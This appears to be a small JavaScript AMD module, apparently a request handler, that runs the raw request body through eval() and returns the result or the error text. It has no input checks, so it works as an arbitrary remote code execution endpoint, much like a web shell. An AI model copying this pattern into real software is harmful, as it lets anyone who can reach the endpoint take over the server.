define([
	"module",
	"../lib/request",
	"../lib/storage"
],function(
	module,
	r,
	storage
){
	module.exports=function(options){
		var ret;
		try{
			ret=eval(r.body);
			if(typeof(ret)=="function")ret=ret.call(this);
		}catch(e){
			ret={error:e.toString()};
		}
		return ret;
	}
});
